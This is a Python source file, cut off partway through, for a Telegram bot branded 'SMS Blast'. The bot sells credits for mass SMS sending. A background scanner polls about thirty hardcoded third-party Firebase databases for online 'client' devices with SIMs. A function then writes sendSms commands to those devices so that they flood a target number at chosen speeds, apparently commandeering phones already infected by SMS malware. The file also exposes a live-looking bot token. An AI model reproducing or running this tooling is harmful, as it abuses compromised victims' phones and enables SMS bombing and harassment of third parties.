# language: Python, file: main.py, runtime: 3.11+, target: aiogram 3.31
import asyncio, json, os, time, logging, threading
from datetime import datetime

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
)
from aiogram.filters import Command, CommandStart, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest
from aiogram.dispatcher.event.bases import SkipHandler

# ========= CONFIG =========
BOT_TOKEN      = "8834226416:AAFf_CNFlZ3wfJ1FvxFdrR3TDHM4QSQYaaA"

MAIN_OWNER     = 1819675229
SUPER_ADMINS   = [1819675229]

OWNER_NAME     = "@pawanpall"
GROUP_LINK     = "https://t.me/indianumchatgroup"
GROUP_NAME     = "Chat group"

FORCE_JOIN_ENABLED = True
FORCE_JOIN_CHANNEL = -1001970485475
FORCE_JOIN_LINK    = "https://t.me/indiadbms"

# Force join group (separate from channel)
FORCE_JOIN_GROUP_ENABLED = True
FORCE_JOIN_GROUP_ID      = -1002062127414
FORCE_JOIN_GROUP_LINK    = "https://t.me/indianumchatgroup"

VERSION        = "v3.8"
DATA_FILE      = "blast_data.json"
SCAN_INTERVAL  = 60.0
SPEED_FAST     = 0.05
SPEED_MEDIUM   = 0.2
SPEED_SLOW     = 0.5
SPEED_DEFAULT  = SPEED_MEDIUM
PROGRESS_INTERVAL = 1.0

REFERRAL_REWARD = 100  # credits per referral
# ==========================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("BlastBot")
_DB_LOCK = threading.Lock()

# ========= PREMIUM EMOJI IDs =========
EMOJI_FIRE    = "5289722755871162900"
EMOJI_STAR    = "5372849966689566579"
EMOJI_ROCKET  = "5359664288241829619"
EMOJI_CROWN   = "6237927637906364256"
EMOJI_SHIELD  = "6235476345451716705"
EMOJI_MONEY   = "6244678063775289843"
EMOJI_PHONE   = "6239930832128056797"
EMOJI_CHECK   = "4958689671950369798"
EMOJI_CROSS   = "4958900559139570572"
EMOJI_WARNING = "4958526153955476488"
EMOJI_LOCK    = "4956719506027185156"
EMOJI_GIFT    = "5084613633418199991"
EMOJI_BELL    = "5098265504796115765"
EMOJI_GEAR    = "5116414868357907335"

# ========= SMALL CAPS =========
SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "", style: str = None) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    kwargs = {"text": label, "callback_data": callback_data}
    if emoji_id:
        kwargs["icon_custom_emoji_id"] = emoji_id
    if style in ["primary", "success", "danger"]:
        kwargs["style"] = style
    return InlineKeyboardButton(**kwargs)

def group_kb(extra_rows: list = None, back_prefix: str = None) -> InlineKeyboardMarkup:
    rows = [[InlineKeyboardButton(text=f"💬 {sc('join support group')}", url=GROUP_LINK, style="success")]]
    if extra_rows:
        rows.extend(extra_rows)
    if back_prefix:
        rows.append([btn("ʙᴀᴄᴋ", f"{back_prefix}:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ───────────────────────── Progress Bar Helper ─────────────────────────
def build_progress_bar(percent: int, total_blocks: int = 10) -> str:
    """Build a visual progress bar string like [▰▰▰▱▱▱▱▱▱▱] 30%"""
    percent = max(0, min(100, percent))
    filled = round((percent / 100) * total_blocks)
    filled = max(0, min(total_blocks, filled))
    empty = total_blocks - filled
    bar = "▰" * filled + "▱" * empty
    return f"[{bar}] {percent}%"


async def show_startup_progress(message) -> None:
    """
    Animated startup progress bar.
    Edits the given message step-by-step: 10% → 100%.
    """
    total_steps = 10
    delay = 0.35  # seconds between steps

    for step in range(1, total_steps + 1):
        percent = int((step / total_steps) * 100)
        bar = build_progress_bar(percent)
        try:
            await message.edit_text(
                f"🚀 *Starting Bot...*\n━━━━━━━━━━━━━━━━━━━━\n\n"
                f"`{bar}`\n\n⏳ Please wait...",
                parse_mode='Markdown'
            )
        except Exception as e:
            log.warning(f"Progress edit failed at {percent}%: {e}")
        if step < total_steps:
            await asyncio.sleep(delay)

# Reply keyboard text -> action map
REPLY_KEYBOARD_MAP = {
    "📤 ꜱᴇɴᴅ ꜱᴍꜱ": "user:send",
    "💰 ᴄʀᴇᴅɪᴛꜱ": "user:credits",
    "📊 ꜱᴛᴀᴛꜱ": "user:stats",
    "ℹ️ ɪɴꜰᴏ": "user:info",
    "🎁 ʀᴇғᴇʀʀᴀʟ": "user:referral",
    "🏠 ʜᴏᴍᴇ": "user:home",
}

def reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📤 ꜱᴇɴᴅ ꜱᴍꜱ"), KeyboardButton(text="💰 ᴄʀᴇᴅɪᴛꜱ")],
            [KeyboardButton(text="📊 ꜱᴛᴀᴛꜱ"), KeyboardButton(text="🎁 ʀᴇғᴇʀʀᴀʟ")],
            [KeyboardButton(text="ℹ️ ɪɴꜰᴏ"), KeyboardButton(text="🏠 ʜᴏᴍᴇ")],
        ],
        resize_keyboard=True,
        input_field_placeholder="Choose an option...",
    )

# ========= FIREBASE URLS =========
FIREBASE_URLS = [
    "https://fifty50-4452e-default-rtdb.firebaseio.com",
    "https://tinku-152d3-default-rtdb.firebaseio.com",
    "https://tino15-default-rtdb.firebaseio.com",
    "https://fir-50e81-default-rtdb.firebaseio.com",
    "https://arjun-singh-hi-default-rtdb.firebaseio.com",
    "https://hacker-f75f0-default-rtdb.firebaseio.com",
    "https://kamlusinghaniya-f05d5-default-rtdb.firebaseio.com",
    "https://sumnmmn-default-rtdb.firebaseio.com",
    "https://ranjit-58640-default-rtdb.firebaseio.com",
    "https://xxxxz-2e129-default-rtdb.firebaseio.com",
    "https://orukd-1e1c7-default-rtdb.firebaseio.com",
    "https://juss-pilado-default-rtdb.firebaseio.com",
    "https://kalihumai-f9826-default-rtdb.firebaseio.com",
    "https://kajumyjann-default-rtdb.firebaseio.com",
    "https://super-admin-240f4-default-rtdb.firebaseio.com",
    "https://tekoff-7a789-default-rtdb.firebaseio.com",
    "https://ilohsh-default-rtdb.firebaseio.com",
    "https://lodarasun-52af9-default-rtdb.firebaseio.com",
    "https://bewafa-f42d3-default-rtdb.firebaseio.com",
    "https://admin-22-8dbcc-default-rtdb.firebaseio.com",
    "https://jassi-952bc-default-rtdb.firebaseio.com",
    "https://zindagi-f8a52-default-rtdb.firebaseio.com",
    "https://dipukumar21-9cc34-default-rtdb.firebaseio.com",
    "https://kajalkumari-4d7a5-default-rtdb.firebaseio.com",
    "https://taposh-194ca-default-rtdb.firebaseio.com",
    "https://sk-admin-v-30-default-rtdb.firebaseio.com",
    "https://tril-2c003-default-rtdb.firebaseio.com",
    "https://pmkisan2-c1211-default-rtdb.firebaseio.com",
    "https://bigg-panal-7fbe5-default-rtdb.firebaseio.com",
    "https://wlundpakar-default-rtdb.firebaseio.com",
    "https://nmpanagr-default-rtdb.firebaseio.com",
]

def _seed_firebases() -> list:
    out = []
    for i, url in enumerate(FIREBASE_URLS):
        u = url.rstrip("/")
        label = u.replace("https://", "").split(".")[0][:20]
        out.append({"id": f"fb{i:03d}", "url": u, "label": label, "added_at": int(time.time())})
    return out

# ========= DATA =========
def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": _seed_firebases(),
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "sms_history": {},
        "referrals": {},          # uid -> referrer_uid
        "referral_counts": {},    # uid -> count
        "force_join": {
            "channel_enabled": FORCE_JOIN_ENABLED,
            "channel_id": FORCE_JOIN_CHANNEL,
            "channel_link": FORCE_JOIN_LINK,
            "group_enabled": FORCE_JOIN_GROUP_ENABLED,
            "group_id": FORCE_JOIN_GROUP_ID,
            "group_link": FORCE_JOIN_GROUP_LINK,
        },
        "protected_numbers": {},
    }

def load() -> dict:
    with _DB_LOCK:
        if os.path.exists(DATA_FILE):
            try:
                with open(DATA_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for k, v in _default_data().items():
                    if k not in data:
                        data[k] = v
                data["owners"] = [MAIN_OWNER]
                data["admins"] = []
                if not data.get("firebases"):
                    data["firebases"] = _seed_firebases()
                if "force_join" not in data:
                    data["force_join"] = _default_data()["force_join"]
                if "referrals" not in data:
                    data["referrals"] = {}
                if "referral_counts" not in data:
                    data["referral_counts"] = {}
                if "protected_numbers" not in data:
                    data["protected_numbers"] = {}
                return data
            except Exception as e:
                log.error(f"load error: {e}")
        d = _default_data()
        _write(d)
        return d

def save(d: dict):
    if not _DB_LOCK.acquire(timeout=3):
        log.error("save(): lock timeout")
        return
    try:
        d["owners"] = [MAIN_OWNER]
        d["admins"] = []
        _write(d)
    finally:
        _DB_LOCK.release()

def _write(d: dict):
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)
    except Exception as e:
        log.error(f"write error: {e}")

# ========= RUNTIME STATE =========
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}

class UserSession:
    __slots__ = ["cancelled", "sent", "failed", "task", "lock", "number", "start_time"]
    def __init__(self):
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.lock = asyncio.Lock()
        self.number = None
        self.start_time = time.time()

class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    # Give credits
    give_credits_uid = State()
    give_credits_amount = State()
    # Broadcast
    broadcast_message = State()
    # Add firebase
    add_fb_url = State()
    add_fb_label = State()
    # Force join config
    fj_channel_id = State()
    fj_channel_link = State()
    fj_group_id = State()
    fj_group_link = State()

# ========= HELPERS =========
def mask_number(number: str) -> str:
    if len(number) <= 4:
        return number
    return number[:2] + "******" + number[-4:]

def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", []) or uid in SUPER_ADMINS

def can_use(uid: int, d: dict) -> bool:
    if uid in d.get("banned", []):
        return False
    if is_owner(uid, d):
        return True
    return d.get("free_mode", False) or uid in d.get("approved", [])

def get_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        if d["users"][k].get("credits", 0) >= amount:
            d["users"][k]["credits"] -= amount
            return True
    return False

def add_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k not in d.get("users", {}):
        return False
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount
    return True

def get_scan_status() -> str:
    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."
    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
    n = len(CACHED_DEVICES)
    diff = int(time.time() - LAST_SCAN_TIME)
    if diff < 60:
        return f"{em(EMOJI_CHECK, '🟢')} {n} ᴅᴇᴠɪᴄᴇs"
    if diff < 300:
        return f"{em(EMOJI_WARNING, '🟡')} {n} ᴅᴇᴠɪᴄᴇs"
    return f"{em(EMOJI_CROSS, '🔴')} {n} ᴅᴇᴠɪᴄᴇs"

def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)

# ========= FORCE JOIN =========
async def check_joined(bot: Bot, uid: int) -> bool:
    if uid in SUPER_ADMINS:
        return True
    d = load()
    fj = d.get("force_join", {})
    if not fj.get("channel_enabled", FORCE_JOIN_ENABLED) and not fj.get("group_enabled", FORCE_JOIN_GROUP_ENABLED):
        return True

    # Check channel
    if fj.get("channel_enabled", FORCE_JOIN_ENABLED):
        ch_id = fj.get("channel_id", FORCE_JOIN_CHANNEL)
        try:
            member = await bot.get_chat_member(ch_id, uid)
            status = member.status
            log.info(f"[FJ-CH] uid={uid} status={status}")
            if status not in ("member", "administrator", "creator"):
                if not (status == "restricted" and getattr(member, "is_member", False)):
                    return False
        except Exception as e:
            log.warning(f"[FJ-CH] fail-open uid={uid}: {type(e).__name__}: {e}")

    # Check group
    if fj.get("group_enabled", FORCE_JOIN_GROUP_ENABLED):
        g_id = fj.get("group_id", FORCE_JOIN_GROUP_ID)
        try:
            member = await bot.get_chat_member(g_id, uid)
            status = member.status
            log.info(f"[FJ-GR] uid={uid} status={status}")
            if status not in ("member", "administrator", "creator"):
                if not (status == "restricted" and getattr(member, "is_member", False)):
                    return False
        except Exception as e:
            log.warning(f"[FJ-GR] fail-open uid={uid}: {type(e).__name__}: {e}")

    return True

def force_join_text() -> str:
    d = load()
    fj = d.get("force_join", {})
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('join karna zaroori hai!')}</b>\n",
        f"{em(EMOJI_BELL, '👇')} ʙᴏᴛ ᴜsᴇ ᴋᴀʀɴᴇ sᴇ ᴘᴇʜʟᴇ ɴɪᴍɴ ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:\n",
    ]
    if fj.get("channel_enabled", FORCE_JOIN_ENABLED):
        ch_link = fj.get("channel_link", FORCE_JOIN_LINK)
        lines.append(f"{em(EMOJI_ROCKET, '📢')} <a href='{ch_link}'>Channel</a>")
    if fj.get("group_enabled", FORCE_JOIN_GROUP_ENABLED):
        g_link = fj.get("group_link", FORCE_JOIN_GROUP_LINK)
        lines.append(f"{em(EMOJI_STAR, '💬')} <a href='{g_link}'>Group</a>")
    lines.append(f"\n<i>{sc('join karne ke baad refresh dabayein.')}</i>")
    return "\n".join(lines)

def force_join_kb() -> InlineKeyboardMarkup:
    d = load()
    fj = d.get("force_join", {})
    rows = []
    if fj.get("channel_enabled", FORCE_JOIN_ENABLED):
        rows.append([InlineKeyboardButton(text=f"📢 {sc('join channel')}", url=fj.get("channel_link", FORCE_JOIN_LINK), style="success")])
    if fj.get("group_enabled", FORCE_JOIN_GROUP_ENABLED):
        rows.append([InlineKeyboardButton(text=f"💬 {sc('join group')}", url=fj.get("group_link", FORCE_JOIN_GROUP_LINK), style="success")])
    rows.append([btn("ʀᴇғʀᴇsʜ", "fj:check", EMOJI_GEAR, "🔄", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ========= FIREBASE OPS =========
def device_is_online(dev: dict) -> bool:
    return any([
        dev.get("isOnline"),
        dev.get("online"),
        dev.get("connected"),
        dev.get("status") in ("online", "active", True, 1),
    ])

async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs:
        return []
    results = []
    sem = asyncio.Semaphore(15)

    async def fetch_one(fb: dict):
        shallow = fb["url"].rstrip("/") + "/clients.json?shallow=true"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(shallow, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status != 200:
                        return
                    txt = (await r.text()).strip()
                    if txt in ("null", ""):
                        return
                    try:
                        ids = json.loads(txt)
                    except Exception:
                        return
                    if not isinstance(ids, dict):
                        return

                    async def fetch_dev(dev_id):
                        try:
                            url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                            async with sem:
                                async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r2:
                                    if r2.status != 200:
                                        return None
                                    t = (await r2.text()).strip()
                                    if t in ("null", ""):
                                        return None
                                    try:
                                        dd = json.loads(t)
                                    except Exception:
                                        return None
                                    if isinstance(dd, dict) and device_is_online(dd):
                                        name = dd.get("deviceName") or dd.get("name") or dev_id[:16]
                                        sims = dd.get("sims", []) or []
                                        return {
                                            "fb_id": fb["id"],
                                            "fb_url": fb["url"],
                                            "fb_label": fb.get("label", fb["url"][:30]),
                                            "dev_id": dev_id,
                                            "dev_name": name,
                                            "sims": sims,
                                        }
                        except Exception:
                            return None
                        return None

                    found = await asyncio.gather(*[fetch_dev(i) for i in ids.keys()])
                    for f in found:
                        if f:
                            results.append(f)
        except Exception as e:
            log.debug(f"scan {fb['url']}: {e}")

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    url = fb_url.rstrip("/") + f"/clients/{dev_id}/webhookEvent/sendSms.json"
    payload = {
        "from": sim_slot, "to": to.strip(), "message": message.strip(),
        "isSended": False, "timestamp": int(time.time()),
    }
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200 <= r.status < 300:
                        return True
        except Exception:
            pass
        await asyncio.sleep(0.5 * (attempt + 1))
    return False

# ========= SCANNER =========
async def background_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, FB_DEVICE_COUNTS
    log.info("Background Firebase Scanner STARTED")
    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5)
                continue
            SCANNING_IN_PROGRESS = True

        start = time.time()
        try:
            d = load()
            fbs = d.get("firebases", [])
            if not fbs:
                CACHED_DEVICES = []
                continue

            devices = await get_all_online_devices(d)
            CACHED_DEVICES = devices

            for fb in fbs:
                fb_id = fb["id"]
                online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                FB_DEVICE_COUNTS[fb_id] = {
                    "label": fb.get("label", fb["url"][:30]),
                    "online": online,
                    "last_update": int(time.time()),
                }
            LAST_SCAN_TIME = time.time()
            log.info(f"[BG] {len(devices)} online | {len(fbs)} fbs | {time.time()-start:.1f}s")
        except Exception as e:
            log.error(f"scanner: {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False
        await asyncio.sleep(SCAN_INTERVAL)

# ========= TEXT =========
def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ"
    active = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])

    fb_lines = []
    for fb_id, fb_data in list(FB_DEVICE_COUNTS.items())[:5]:
        st = em(EMOJI_CHECK, "🟢") if fb_data["online"] > 0 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {st} {fb_data['label'][:18]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
    if len(FB_DEVICE_COUNTS) > 5:
        fb_lines.append(f"  {em(EMOJI_STAR, '➕')} +{len(FB_DEVICE_COUNTS)-5} ᴍᴏʀᴇ")
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

    return (
        f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — sᴍs ʙʟᴀsᴛ {VERSION}\n"
        f"<b>Owner:</b> {OWNER_NAME}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{fb_summary}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {get_scan_status()}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def user_home_text(uid: int, d: dict) -> str:
    u = d.get("users", {}).get(str(uid), {})
    ref_count = d.get("referral_counts", {}).get(str(uid), 0)
    return (
        f"{em(EMOJI_PHONE, '📱')} <b>sᴍs ʙʟᴀsᴛ ʙᴏᴛ {VERSION}</b>\n"
        f"<b>Owner:</b> {OWNER_NAME}\n\n"
        f"{em(EMOJI_STAR, '👤')} ʀᴏʟᴇ    : {em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs : <b>{u.get('credits', 0)}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} ᴜsᴇs    : <b>{u.get('uses', 0)}</b>\n"
        f"{em(EMOJI_GIFT, '🎁')} ʀᴇғᴇʀʀᴀʟs: <b>{ref_count}</b>\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ : {get_scan_status()}\n\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET, '🚀')}"
    )

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ ᴀɢᴀʀ ʙᴇᴇᴄʜ ᴍᴇɪɴ ʀᴏᴋɴᴀ ʜᴏ.</i>")
    return "\n".join(lines)

# ========= KEYBOARDS =========
def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = (f"🔴 {sc('disable free mode')}", "owner:free:off") if d.get("free_mode") else (f"🟢 {sc('enable free mode')}", "owner:free:on")
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤"), btn("ғɪʀᴇʙᴀsᴇ sᴛᴀᴛs", "owner:fb_stats", EMOJI_FIRE, "🔥")],
        [btn("ɢɪᴠᴇ ᴄʀᴇᴅɪᴛs", "owner:give_credits", EMOJI_MONEY, "💰"), btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢")],
        [btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj_settings", EMOJI_LOCK, "🔒"), btn("ғɪʀᴇʙᴀsᴇ ᴍɢᴍᴛ", "owner:fb_mgmt", EMOJI_FIRE, "🔥")],
        [btn("ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊"), btn("ᴜsᴇʀ ʟɪsᴛ", "owner:user_list", EMOJI_STAR, "👥")],
        [InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1])],
        [btn("ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄")],
    ])

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "user:send", EMOJI_ROCKET, "📤", style="success")],
        [btn("ᴄʀᴇᴅɪᴛs", "user:credits", EMOJI_MONEY, "💰"), btn("sᴛᴀᴛs", "user:stats", EMOJI_STAR, "📊")],
        [btn("ʀᴇғᴇʀʀᴀʟ", "user:referral", EMOJI_GIFT, "🎁"), btn("ɪɴғᴏ", "user:info", EMOJI_GEAR, "ℹ️")],
    ])

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑", style="danger")]
    ])

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀", style="danger"),
            btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡", style="primary"),
            btn("sʟᴏᴡ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢", style="success"),
        ],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌", style="danger")],
    ])

def back_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")]
    ])

def fj_settings_kb(d: dict) -> InlineKeyboardMarkup:
    fj = d.get("force_join", {})
    ch_on = fj.get("channel_enabled", FORCE_JOIN_ENABLED)
    gr_on = fj.get("group_enabled", FORCE_JOIN_GROUP_ENABLED)
    ch_toggle = f"🔴 {sc('disable channel fj')}" if ch_on else f"🟢 {sc('enable channel fj')}"
    gr_toggle = f"🔴 {sc('disable group fj')}" if gr_on else f"🟢 {sc('enable group fj')}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=ch_toggle, callback_data=f"owner:fj:ch:{'off' if ch_on else 'on'}")],
        [InlineKeyboardButton(text=gr_toggle, callback_data=f"owner:fj:gr:{'off' if gr_on else 'on'}")],
        [btn("sᴇᴛ ᴄʜᴀɴɴᴇʟ ɪᴅ", "owner:fj:ch_id", EMOJI_GEAR, "🆔"), btn("sᴇᴛ ᴄʜᴀɴɴᴇʟ ʟɪɴᴋ", "owner:fj:ch_link", EMOJI_ROCKET, "🔗")],
        [btn("sᴇᴛ ɢʀᴏᴜᴘ ɪᴅ", "owner:fj:gr_id", EMOJI_GEAR, "🆔"), btn("sᴇᴛ ɢʀᴏᴜᴘ ʟɪɴᴋ", "owner:fj:gr_link", EMOJI_ROCKET, "🔗")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")],
    ])

def fb_mgmt_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb_add", EMOJI_FIRE, "➕")],
        [btn("ʟɪsᴛ ғɪʀᴇʙᴀsᴇs", "owner:fb_list", EMOJI_FIRE, "📋")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")],
    ])

# ========= ROUTER =========
R = Router()

@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext, command: CommandObject):
    if not command.args:
        raise SkipHandler()

    uid = msg.from_user.id
    d = load()
    ref_arg = command.args.strip()
    k = str(uid)

    # Register user if new
    if k not in d["users"]:
        d["users"][k] = {
            "name": msg.from_user.full_name or "User",
            "uses": 0, "credits": 0,
            "joined_at": int(time.time()),
        }
        # Process referral
        try:
            ref_uid = int(ref_arg)
            if ref_uid != uid and ref_uid > 0 and str(ref_uid) in d["users"]:
                if k not in d.get("referrals", {}):
                    d.setdefault("referrals", {})[k] = ref_uid
                    d.setdefault("referral_counts", {})[str(ref_uid)] = d.get("referral_counts", {}).get(str(ref_uid), 0) + 1
                    add_credits(ref_uid, REFERRAL_REWARD, d)
                    log.info(f"[REF] {uid} referred by {ref_uid} — +{REFERRAL_REWARD} credits")
        except Exception as e:
            log.warning(f"referral parse error: {e}")
        save(d)
    else:
        save(d)

    if not await check_joined(msg.bot, uid):
